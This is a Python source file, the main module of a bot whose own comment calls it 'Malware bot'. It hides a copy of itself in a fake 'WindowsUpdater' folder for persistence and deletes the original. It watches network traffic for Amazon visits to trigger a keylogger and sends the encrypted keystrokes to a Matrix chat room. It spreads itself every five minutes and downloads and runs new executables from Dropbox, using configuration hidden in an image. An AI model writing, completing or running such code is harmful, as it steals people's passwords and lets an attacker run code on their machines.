import os
import schedule
from shutil import copyfile
from subprocess import Popen
from sys import executable
from threading import Thread
from matrix_client.errors import MatrixHttpLibError

from bot.communication.dropbox_client import load_from_dropbox
from bot.communication.matrix_client import send_msg
from bot.lifecycle.persistence import persist
from bot.lifecycle.self_destruction import self_destruct
from bot.lifecycle.spreading import spread
from bot.malware.key_logger import KeyLogger
from bot.malware.low_level_sniffer import listen_traffic
from bot.tools.encryption import encrypt, decrypt_dictionary
from bot.tools.internet_connectivity import execute_on_stable_connection
from bot.tools.steganography import reveal
from bot.tools.unzipping import find_by_extension, unzip


"""
------ Malware bot ------
"""

TARGET_DOMAIN = 'amazon'
REMOTE_UPDATES_FILE = "img.png"
LOCAL_UPDATES_FILE = "img.png"
KEY_LOGGING_SECONDS_DURATION = 20
SNIFFING_PAUSE_SECONDS_DURATION = KEY_LOGGING_SECONDS_DURATION + 10

# it's recommended to hardcode default credentials,
# cause it's easier to reveal credentials passed as CLI arguments
# replace %matrix.*%, %dropbox.*% and other tokens with real values
MATRIX_SERVER = "%matrix.server%"
MATRIX_USER = "%matrix.user%"
MATRIX_PASSWORD = "%matrix.pwd%"
MATRIX_ROOM = "%matrix.room%"
DROPBOX_API_KEY = "%dropbox.api_key%"
ARCHIVE_PASSWORD = "%archive.password%"


def run_new_executable(destination_binary: str, destination_folder: str):
    persist(destination_binary)
    Popen(destination_binary, cwd=destination_folder)
    self_destruct()


def load_new_executable(updated_executable: str) -> (str, str):
    if not updated_executable.endswith(".zip"):
        return
    archive_path = load_from_dropbox(DROPBOX_API_KEY, updated_executable)
    if not archive_path:
        return
    new_executable = find_by_extension(archive_path, ".exe")
    if not new_executable:
        return
    unzipped: bool = unzip(archive_path, ARCHIVE_PASSWORD, new_executable)
    if not unzipped:
        return
    os.remove(archive_path)
    working_directory = os.getcwd()
    executable_absolute_path = working_directory + '\\' + new_executable

    return executable_absolute_path, working_directory


def load_updates():
    # DON't delete updates file, it's needed for a possible new process
    updates_file_path: str = load_from_dropbox(DROPBOX_API_KEY, REMOTE_UPDATES_FILE)
    if not updates_file_path:
        return
    encrypted_configuration = reveal(updates_file_path)
    if not encrypted_configuration:
        return
    update_configuration = decrypt_dictionary(encrypted_configuration)
    if not update_configuration:
        return
    updated_executable = update_configuration['updated_executable']
    if updated_executable:
        executable_absolute_path, working_directory = load_new_executable(updated_executable)
        run_new_executable(executable_absolute_path, working_directory)


def read_updates(local_updates_file: str) -> dict:
    encrypted_updates = reveal(local_updates_file)
    if not encrypted_updates:
        return {}
    return decrypt_dictionary(encrypted_updates)


def get_matrix_credentials():
    updates: dict = read_updates(LOCAL_UPDATES_FILE)
    server_name = updates['matrix_server'] if updates.get('matrix_server') else MATRIX_SERVER
    username = updates['matrix_user'] if updates.get('matrix_user') else MATRIX_USER
    password = updates['matrix_pwd'] if updates.get('matrix_pwd') else MATRIX_PASSWORD
    room_id = updates['matrix_room'] if updates.get('matrix_room') else MATRIX_ROOM
    return server_name, username, password, room_id


def start_thread_on_connection(action: callable):
    Thread(target=execute_on_stable_connection, args=(action,)).start()


def intercept_user_keys():
    key_logger = KeyLogger()
    logs: str = key_logger.intercept_keys(KEY_LOGGING_SECONDS_DURATION)
    if not logs:
        return
    encrypted_logs = encrypt(logs)
    (server_name, username, password, room_id) = get_matrix_credentials()
    try:
        send_msg(server_name, username, password, room_id, encrypted_logs)
    except MatrixHttpLibError:
        pass


def spy():
    listening_traffic: callable = lambda: listen_traffic(
        TARGET_DOMAIN,
        SNIFFING_PAUSE_SECONDS_DURATION,
        intercept_user_keys
    )
    start_thread_on_connection(listening_traffic)


def copy_exploit_to_destination(exploit_sub_folder='') -> (str, str):
    user_folder = os.getenv('USERPROFILE')
    destination_folder = user_folder + exploit_sub_folder
    os.makedirs(name=destination_folder, exist_ok=True)

    binary_name = executable.split('\\')[-1]
    new_binary_name = 'copy-' + binary_name  # new name is needed in order not to kill all bot processes
    destination_binary = destination_folder + '\\' + new_binary_name
    copyfile(executable, destination_binary)

    return destination_binary, destination_folder


def main():
    destination_sub_folder = "\\AppData\\Roaming\\WindowsUpdater"  # this folder doesn't look suspicious
    if destination_sub_folder in executable:
        spy()
        schedule.every(5).minutes.do(spread, executable)
        schedule.every(60).minutes.do(start_thread_on_connection, load_updates)
        while True:
            schedule.run_pending()
    else:
        destination_binary, destination_folder = copy_exploit_to_destination(destination_sub_folder)
        run_new_executable(destination_binary, destination_folder)


if __name__ == '__main__':
    main()
